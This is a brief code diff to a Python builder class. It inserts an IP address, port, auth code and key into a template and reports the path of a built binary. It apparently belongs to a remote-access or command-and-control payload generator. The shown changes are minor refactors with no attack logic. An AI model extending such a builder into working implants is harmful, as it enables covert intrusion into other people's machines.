@@ -20,8 +20,8 @@ class builder():
             
             content = content.replace("__ipaddr__", ip)
             content = content.replace("12345", str(port))
-            content = content.replace("'authcode'", f"'{system.getdata('authcode')}'")
-            content = content.replace("'RANDOM_KEY'", f"'{system.getdata('KEY')}'")
+            content = content.replace("'authcode'", f"'{system.getdata('authcode', "user_data")}'")
+            content = content.replace("'RANDOM_KEY'", f"'{system.getdata('KEY', "user_data")}'")
             
             if isstaged:
                 content = content.replace('"PATH"', '"main.exe"')
@@ -71,7 +71,7 @@ class builder():
             system.clear_screen()
             system.printheader()
             print(Fore.LIGHTCYAN_EX + f"[+] Build Complete!")
-            print(Fore.LIGHTYELLOW_EX + f"[+] /{BINARIES_DIR}/{output_name}.{type}")
+            print(Fore.LIGHTYELLOW_EX + f"[+] {BINARIES_DIR}\\{output_name}.{type}")
             input('OK')
         except Exception as e:
             print(Fore.LIGHTRED_EX + f"[-] Error during build: {e}")
